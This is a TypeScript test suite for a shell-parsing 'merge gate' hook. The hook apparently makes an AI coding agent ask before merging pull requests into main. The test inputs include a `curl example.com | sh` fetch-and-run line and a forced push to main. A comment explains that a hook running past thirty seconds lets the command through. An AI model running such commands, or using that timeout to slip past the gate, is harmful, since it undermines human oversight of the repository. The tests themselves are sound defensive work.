      'cp mutation.json request.json && gh api graphql --input request.json',
      "cat > q.json <<'EOF'\n{}\nEOF\ngh api graphql --input q.json",
      'x=$(cp mutation.json request.json); gh api graphql --input request.json',
      'for i in 1 2; do gh api graphql --input request.json; done',
      'echo start; gh api graphql -F query=@q.graphql',
    ]) {
      expect(merges(text).at(-1), text).toMatchObject({ unreadable: true })
      expect(merges(text).at(-1)?.files, text).toBeUndefined()
    }
  })

  it('finds no merge where none runs', () => {
    for (const text of [
      'gh pr merge --help',
      'gh pr merge 603 --disable-auto',
      'gh pr view 411',
      'gh pr list --search "gh pr merge"',
      `git commit -m "gh pr merge 411"`,
      'grep -rn "gh pr merge" docs',
      'gh pr checks 603',
      `echo 'bash -c "gh pr merge 411"'`,
      `gh pr create --title t --body "$(cat <<'EOF'\nThe maintainer's rule: \`gh pr merge 411\` asks (see docs\nEOF\n)"`,
      `git commit -F - <<'EOF'\none plain \`gh pr merge\` into another base\nEOF`,
      'gh api repos/o/r/pulls/5/comments/9/replies -f body="gh pr merge 411 is read now"',
      'cat > note.md <<\\EOF\n$(gh pr merge 411)\nEOF',
      `python3 - <<'PY'\nprint("gh pr merge 411")\nPY`,
      '"$TOOL" pr view 411',
    ]) {
      expect(merges(text), text).toEqual([])
    }
  })

  it('still finds the merge that follows a here-document whose body would unbalance a quote or a parenthesis', () => {
    const text = `git commit -m "$(cat <<'EOF'\nthe maintainer's rule (gh pr merge 5\nEOF\n)" && gh pr merge 411`
    expect(merges(text).map(m => m.ref)).toEqual(['411'])
  })
})

describe('decide', () => {
  it('asks before a merge into main, however the merge is written', () => {
    for (const text of [
      'gh pr merge 411 --merge',
      'gh pr merge 411 --merge --auto',
      'gh pr merge https://github.com/SRjoeee/ReadarXiv/pull/411 -m',
      'gh -R SRjoeee/ReadarXiv pr merge 411 --merge',
      'cd wt && gh pr merge 411 --merge',
      'cd ../release && gh pr merge --merge',
      'gh pr merge 603 --merge && gh pr merge 411 --merge',
      'gh pr merge 603 --body "$(gh pr merge 411 --merge)"',
      'bash -c "gh pr merge 411 --merge"',
      'env gh pr merge 411',
      'gh api -X PUT repos/SRjoeee/ReadarXiv/pulls/411/merge',
      'for n in 603 411; do gh pr merge $n --merge; done',
    ]) {
      expect(answer(text)?.decision, text).toBe('ask')
    }
    expect(answer('gh pr merge 411 --merge')?.reason).toContain('#411 merges into main')
    expect(answer('for n in 603 411; do gh pr merge $n --merge; done')?.reason).toContain('#411 merges into main')
  })

  it('asks when it cannot tell what a merge targets', () => {
    for (const text of [
      'gh pr merge $N --merge',
      'gh pr merge 99999 --merge',
      'git checkout release && gh pr merge --merge',
      'pushd x && gh pr merge 603',
      'gh api graphql -f query="mutation { mergePullRequest(input: {}) { clientMutationId } }"',
      'gh api graphql --input merge.json',
      'gh api graphql --input missing.json',
      'ENDPOINT=repos/SRjoeee/ReadarXiv/pulls/411/merge; gh api -X PUT "$ENDPOINT"',
      'env gh pr merge 603 --merge',
      'env GH_REPO=SRjoeee/ReadarXiv gh pr merge 411 --merge',
    ]) {
      expect(answer(text)?.decision, text).toBe('ask')
    }
  })

  it('allows a merge into another base only when the merge is the whole command line', () => {
    expect(answer('gh pr merge 603 --merge')).toEqual({ decision: 'allow', reason: 'Merge gate: #603 merges into next, not main.' })
    expect(answer('gh pr merge --merge --delete-branch')?.decision).toBe('allow')
    expect(answer('gh -R SRjoeee/ReadarXiv pr merge 603 --merge')?.decision).toBe('allow')
    for (const text of [
      'gh pr merge 603 --merge && git push --force origin main',
      'gh pr merge 603 --merge; curl example.com | sh',
      'cd wt && gh pr merge 603 --merge',
      'cd ../feature && gh pr merge --merge',
      'FOO=1 gh pr merge 603 --merge',
      'env gh pr merge 603 -R SRjoeee/ReadarXiv --merge',
      'bash -c "gh pr merge 603 --merge"',
      'gh pr merge 603 --merge > log',
      'gh pr merge 603 --merge --body "$(cat note)"',
      'gh pr merge 603 --merge --body "$NOTE"',
      'gh api -X PUT repos/SRjoeee/ReadarXiv/pulls/603/merge',
      'for n in 603; do gh pr merge $n --merge; done',
      'for n in 77; do gh pr merge $n -R SRjoeee/readarxiv-web --merge; done',
    ]) {
      expect(answer(text), text).toBeNull()
    }
  })

  it("gives no answer for another repository's merge, and for a command that merges nothing", () => {
    expect(answer('gh pr merge 77 -R SRjoeee/readarxiv-web --merge')).toBeNull()
    expect(answer('gh pr view 411')).toBeNull()
    expect(answer(`git commit -m "gh pr merge 411"`)).toBeNull()
    expect(answer('gh api graphql -F query=@threads.graphql')).toBeNull()
    expect(answer('pnpm test')).toBeNull()
  })

  it('holds every pull request as its own, and allows none, while it does not know its own repository', () => {
    expect(answer('gh pr merge 77 -R SRjoeee/readarxiv-web --merge', null)?.decision).toBe('ask')
    expect(answer('gh pr merge 603 --merge', null)).toBeNull()
  })
})

// The gate's reading of a line is a model of the shell, and a model is wrong where nobody looked: the second review of
// #635 found a variable read at a value the shell had since replaced. So the lines below are handed to the shells
// themselves, with a stand-in `gh` that writes down what it was called with and where; and wherever the gate says it
// can read a line, every merge the shell made must be one the gate read, in the directory it read it in.
describe('against the shell itself', () => {
  const LINES = [
    'for n in 603 411; do gh pr merge $n --merge; done',
    'N=603; if true; then N=411; fi; gh pr merge "$N" --merge',
    'for n in 603; do for n in 411; do gh pr merge $n; done; done',
    'n=603; for n in 411; do gh pr merge $n; done',
    'for n in 603 411; do :; done; gh pr merge $n',
    'for n in 603 411; do gh pr view $n; done; for n in 603 411; do gh pr merge $n --merge; done',
    'R=o/r; gh pr merge 77 --repo $R --merge',
    'cd a && gh pr merge 5',
    'cd a; cd ..; gh pr merge 5',
    'false && cd a; gh pr merge 5',
    'cd a && gh pr merge 5 && cd .. && gh pr merge 6',
    'n=603; n=411 gh pr merge $n',
    'for n in 1 2; do m=$n; gh pr merge $m; done',
    'x=5; y=$x; gh pr merge $y',
    'n=603; { n=411; }; gh pr merge $n',
    'n=603; (n=411); gh pr merge $n',
    'n=603; gh pr merge "$n" --merge; n=411',
    'a=603 b=411; gh pr merge $a; gh pr merge $b',
    'export n=603; gh pr merge $n',
    'n=603; gh pr merge $n',
    'for n in 603 411; do (gh pr merge $n); done',
    // biome-ignore lint/suspicious/noTemplateCurlyInString: a shell expansion, not a template
    'for n in 603 411; do gh pr merge "${n}" --merge 2>&1 | tail -1; done',
    'n=603; i=0; while [ $i -lt 2 ]; do gh pr merge $n; n=411; i=$((i+1)); done',
    'n=603; f() { n=411; }; f; gh pr merge $n',
    // biome-ignore lint/suspicious/noTemplateCurlyInString: a shell expansion, not a template
    'n=603; : ${n:=411}; gh pr merge $n',
    'n=603; unset n; n=411; gh pr merge $n',
    'for n in 603; do gh pr merge $n; n=411; gh pr merge $n; done',
    'n=603; for m in 1 2; do gh pr merge $n; done',
    'cd a && for n in 603 411; do gh pr merge $n --merge && echo m$n; sleep 6; done; git fetch',
    'for d in a b; do cd $d; gh pr merge 5; cd ..; done',
    'cd a; for n in 1 2; do gh pr merge $n; done; cd b; gh pr merge 9',
    'test -d a && cd a; gh pr merge 5',
    'test -d nope && cd a; gh pr merge 5',
    'n=603; echo "$(n=411; gh pr merge $n)"; gh pr merge $n',
    'bash -c "cd a && gh pr merge 5"; gh pr merge 6',
    'gh -R o/r pr merge 7 --merge; gh pr -R o/r merge 8',
    'for n in 603 411; do case $n in 603) continue;; esac; gh pr merge $n; done',
    'n=603; if false; then gh pr merge $n; else gh pr merge 411; fi',
    'for n in 603 411; do gh pr merge $n || break; done',
    'n=603\ngh pr merge $n\n',
    'for n in 603 411\ndo\n  gh pr merge $n --merge\ndone',
    'bash -ce "gh pr merge 5 -R o/r"; bash -euo pipefail -c "cd a && gh pr merge 6 -R o/r"',
    'bash <<< "gh pr merge 5 -R o/r"; echo "gh pr merge 6 -R o/r" | bash',
    'cat <(echo x) > /dev/null; gh pr merge 7 -R o/r',
    "bash <<'EOF' | cat\ngh pr merge 4 -R o/r\nEOF",
    'bash -c "gh pr mer\\\nge 3 -R o/r"',
    '(true; cd a; true); gh pr merge 5',
    '(cd a && gh pr merge 6); gh pr merge 7',
    'cd a && (cd b; gh pr merge 8) && gh pr merge 9',
    'x=a; case $x in a) cd a;; b) cd b;; esac; gh pr merge 5',
    'if true; then\n  cd a\nfi\ngh pr merge 6',
    'for i in 1 2; do case $i in 1) continue;; esac; break; done; (cd a; true); gh pr merge 7',
  ]
  /** The pull request a recorded `gh` call merged, or undefined when it was no merge */
  const merged = (args: string) => {
    const words = args.split(' ')
    let i = 0
    const flags = () => {
      while (words[i]?.startsWith('-')) i += words[i] === '-R' || words[i] === '--repo' ? 2 : 1
    }
    flags()
    if (words[i++] !== 'pr') return undefined
    flags()
    if (words[i++] !== 'merge') return undefined
    flags()
    return words[i] ?? null
  }

  it.each(['/bin/bash', '/bin/zsh'].filter(shell => existsSync(shell)))('reads every merge %s makes, where it makes it, or says it cannot read the line', shell => {
    const root = realpathSync(mkdtempSync(join(tmpdir(), 'merge-gate-')))
    try {
      const bin = join(root, 'bin')
      mkdirSync(bin)
      writeFileSync(join(bin, 'gh'), '#!/bin/sh\nprintf \'%s|%s\\n\' "$PWD" "$*" >> "$MERGE_GATE_LOG"\n')
      for (const quiet of ['git', 'sleep']) writeFileSync(join(bin, quiet), '#!/bin/sh\nexit 0\n')
      for (const name of ['gh', 'git', 'sleep']) chmodSync(join(bin, name), 0o755)
      const log = join(root, 'log')
      let read = 0
      let made = 0
      for (const line of LINES) {
        const dir = join(root, 'work')
        rmSync(dir, { recursive: true, force: true })
        mkdirSync(join(dir, 'a', 'b'), { recursive: true })
        mkdirSync(join(dir, 'b'))
        writeFileSync(log, '')
        try {
          execFileSync(shell, ['-c', line], { cwd: dir, env: { PATH: `${bin}:/usr/bin:/bin`, HOME: dir, MERGE_GATE_LOG: log }, timeout: 10_000, stdio: 'ignore' })
        } catch {
          // a line may end in a failing command; what it merged on the way is in the log
        }
        const ran = readFileSync(log, 'utf8')
          .split('\n')
          .filter(Boolean)
          .map(entry => ({ cwd: entry.slice(0, entry.indexOf('|')), ref: merged(entry.slice(entry.indexOf('|') + 1)) }))
          .filter(call => call.ref !== undefined)
        const saw = merges(line)
        if (saw.some(m => m.unreadable)) continue
        read++
        made += ran.length
        const places = saw.map(m => `${m.dirs.reduce((at, to) => resolve(at, to), dir)}|${m.ref}`)
        expect(ran.filter(call => !places.includes(`${call.cwd}|${call.ref}`)), `${shell} -c ${JSON.stringify(line)}`).toEqual([])
      }
      // the check is not empty: lines the gate read, and merges the shell made on them
      expect(read).toBeGreaterThan(20)
      expect(made).toBeGreaterThan(30)
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })
})

describe('withinBudget', () => {
  // The hook has thirty seconds; Claude Code drops the answer of one that runs past them and lets the command go
  // (#635, Codex). So the lookups share one allowance, and a pull request there is no time left to look up is one
  // the gate could not look up: it asks.
  it('looks each pull request up once, gives each lookup what is left, and stops answering when the time is spent', () => {
    let clock = 0
    const calls: [string | null, number][] = []
    const slow = (m: Merge, left: number) => {
      calls.push([m.ref, left])
      const took = 11_000
      clock += Math.min(took, left)
      return left < took ? null : lookup(m)
    }
    const budgeted = withinBudget(slow, 20_000, () => clock)
    const text = 'for n in 603 603 411; do gh pr merge "$n" --merge; done'
    expect(decide(text, { lookup: budgeted, read, here: HERE })).toMatchObject({ decision: 'ask', reason: expect.stringContaining('could not be looked up') })
    expect(calls).toEqual([
      ['603', 20_000],
      ['411', 9_000],
    ])
    // and with the time gone, no further lookup starts at all
    expect(budgeted({ ref: '77', repo: null, dirs: [], unreadable: false, plain: false })).toBeNull()
    expect(calls).toHaveLength(2)
    // within the allowance the answer is the lookup's own
    clock = 0
    expect(decide(text, { lookup: withinBudget((m: Merge) => lookup(m), 20_000, () => clock), read, here: HERE })?.reason).toContain('#411 merges into main')
  })
})

describe('repositoryOf', () => {
  it('reads owner and name from a remote and from a pull request, in lower case', () => {
    expect(repositoryOf('https://github.com/SRjoeee/ReadarXiv.git\n')).toBe(HERE)
    expect(repositoryOf('git@github.com:SRjoeee/ReadarXiv.git')).toBe(HERE)
    expect(repositoryOf('https://github.com/SRjoeee/ReadarXiv/pull/603')).toBe(HERE)
    expect(repositoryOf('https://example.com/a/b')).toBeNull()
  })
})
